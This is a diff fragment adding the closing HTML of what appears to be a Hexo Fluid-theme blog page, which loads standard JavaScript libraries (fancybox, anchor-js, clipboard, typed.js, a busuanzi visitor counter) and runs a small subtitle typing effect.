+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
